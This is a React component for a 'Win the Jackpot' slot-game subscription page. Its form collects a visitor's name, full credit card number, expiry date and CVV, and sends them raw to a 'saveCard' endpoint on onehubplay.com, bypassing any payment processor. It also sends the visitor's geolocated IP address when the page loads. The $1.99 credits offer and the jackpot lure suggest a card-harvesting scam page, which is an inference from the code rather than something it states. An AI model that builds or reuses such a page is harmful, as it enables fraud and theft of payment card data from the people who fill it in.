import React, { useState, useEffect ,useRef } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

const Suscribe = () => {

  const geoip2 = window.geoip2;

  const [geoData, setGeoData] = useState(null);
  const [uid, setUid] = useState(null);
  const effectRan = useRef(false);

  useEffect(() => {
    geoip2.country(
      (response1) => {
        setGeoData(response1);
      },
      (error) => {
        console.log(error);
      }
    );
  }, []);

  useEffect(() => {
    setUid(localStorage.getItem("user"));
    if (geoData == null) return;

    if (effectRan.current) return; // Return early if effect has already run once

    let postData = {
      ip_address: geoData?.traits?.ip_address
        ? geoData?.traits?.ip_address
        : "34834",
    };

    const trackPage = async () => {
      axios.defaults.withCredentials = true;
      return await axios.post(
        `https://onehubplay.com:8000/api/slot-game-1-cards`,
        postData
      );
    };

    trackPage()
      .then((resp) => {
        console.log(resp);
      })
      .catch((error) => {
        console.log(error);
      });

    effectRan.current = true; // Mark effect as run
  }, [geoData]);

  const [formControls, setFormControls] = useState({
    firstName: "",
    lastName: "",
    card: "",
    exp_date_m: "",
    exp_date_y: "",
    cvv: "",
  });
  const [loading, setLoading] = useState(false); // Add loading state
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    const token = localStorage.getItem("token");
    let user = JSON.parse(
      localStorage.getItem("user") ? localStorage.getItem("user") : "{}"
    );
    console.log("Stored token:", token);
    console.log("Stored user:", user);
    e.preventDefault();

    let postData = {
      ...formControls,
    };

    postData = {
      ...postData,
      first_name: formControls?.firstName,
      last_name: formControls?.lastName,
      card_number: formControls?.card,
      user_id: user?.id,
    };
    console.log(postData);

    // Set loading to true when sending request
    setLoading(true);

    try {
      const response = await axios.post(
        `https://onehubplay.com:8000/api/saveCard`,
        postData,
        { headers: { Authorization: `Bearer ${token}` } }
      );
      console.log(response);

      // Reset form fields
      setFormControls({
        firstName: "",
        lastName: "",
        card: "",
        exp_date_m: "",
        exp_date_y: "",
        cvv: "",
      });

      // Navigate to the next page after a successful submission
      navigate("/game");
    } catch (error) {
      console.error("API request error:", error);
    } finally {
      // Set loading to false after request finishes
      setLoading(false);
    }
  };

  return (
    <div
      className="flex items-center justify-center min-h-screen bg-cover bg-center"
      style={{ backgroundImage: "url('/images/Background_1.png')" }}
    >
      <form
        onSubmit={(e) => handleSubmit(e)}
        className="bg-[#24334B] w-full lg:w-[510px]  h-[570px] p-[10px] flex flex-col items-center justify-center rounded"
      >
        <h1 className="text-white block text-3xl mb-[10px] font-extrabold font-medium spacing-[5px]">
          Win the Jackpot!
        </h1>
        <h3 className="text-white text-[20px]">1,000,000 USD</h3>
        <video autoPlay muted loop className="w-[150px]">
          <source src="images/gold2.webm" type="video/webm" />
          Your browser does not support the video tag.
        </video>
        <div className="bg-transparent px-4 py-2">
          <div className="grid grid-cols-2 gap-x-[15px]">
            <div className="mb-[10px]">
              <label className="mb-[5px] text-white block text-xs font-semibold">
                First Name
              </label>
              <input
                value={formControls.firstName}
                required
                onChange={(e) =>
                  setFormControls({
                    ...formControls,
                    firstName: e.target.value,
                  })
                }
                className="h-[30px] bg-white border border-gray-400 block rounded w-full mb-[5px] px-[5px]"
              />
            </div>
            <div className="mb-[10px]">
              <label className="mb-[5px] text-white block text-xs font-semibold">
                Last Name
              </label>
              <input
                value={formControls.lastName}
                required
                onChange={(e) =>
                  setFormControls({
                    ...formControls,
                    lastName: e.target.value,
                  })
                }
                className="h-[30px] bg-white border border-gray-400 block rounded w-full mb-[5px] px-[5px]"
              />
            </div>
          </div>
          <div className="mb-[10px]">
            <div className=" mb-[5px] flex justify-between items-center">
              <label className="text-white block text-xs font-semibold">
                Credit Card Number
              </label>
              <div className="flex gap-x-[5px]">
                <img className="h-[10px] object-cover" src="images/visa.png" />
                <img className="h-[10px] object-cover" src="images/mcard.png" />
              </div>
            </div>
            <input
              minLength={12}
              maxLength={16}
              value={formControls.card}
              onChange={(e) =>
                setFormControls({ ...formControls, card: e.target.value })
              }
              className="h-[30px] bg-white border border-gray-400 block rounded w-full mb-[5px] px-[5px]"
            />
          </div>
          <div className="grid grid-cols-3 gap-x-[15px]">
            <div className="mb-[10px]">
              <label className="mb-[5px] text-white block text-xs font-semibold">
                Expiration Date
              </label>
              <select
                value={formControls.exp_date_m}
                required
                onChange={(e) =>
                  setFormControls({
                    ...formControls,
                    exp_date_m: e.target.value,
                  })
                }
                className="h-[30px] bg-white border border-gray-400 block rounded w-full mb-[5px]"
              >
                <option>MM</option>
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
              </select>
            </div>
            <div className="mb-[10px]">
              <label className="mb-[5px] text-white block text-xs font-semibold invisible">
                d
              </label>
              <select
                value={formControls.exp_date_y}
                required
                onChange={(e) =>
                  setFormControls({
                    ...formControls,
                    exp_date_y: e.target.value,
                  })
                }
                className="h-[30px] bg-white border border-gray-400 block rounded w-full mb-[5px]"
              >
                <option>YY</option>
                <option value="23">23</option>
                <option value="24">24</option>
                <option value="25">25</option>
                <option value="26">26</option>
                <option value="27">27</option>
                <option value="28">28</option>
                <option value="30">30</option>
                <option value="31">31</option>
                <option value="32">32</option>
                <option value="33">33</option>
                <option value="34">34</option>
                <option value="35">35</option>
              </select>
            </div>
            <div className="mb-[10px]">
              <label className="mb-[5px] text-white block text-xs font-semibold">
                CVV
              </label>
              <input
                minLength={2}
                value={formControls.cvv}
                required
                onChange={(e) =>
                  setFormControls({ ...formControls, cvv: e.target.value })
                }
                className="h-[30px] bg-white border border-gray-400 block rounded w-full mb-[5px] px-[5px]"
              />
            </div>
          </div>

          <p className="text-center text-[19px] text-white mt-[20px]">
            Buy More Credits
          </p>

          <button
            type="submit"
            className="block bg-[#15803D] px-[40px] py-[5px] text-[20px] rounded-full mx-auto text-white font-semibold uppercase mt-[7px]"
            disabled={loading} // Disable button while loading
          >
            {loading ? "Processing..." : "Buy 100 credits for $1.99"}
          </button>
        </div>
      </form>
    </div>
  );
};

export default Suscribe;
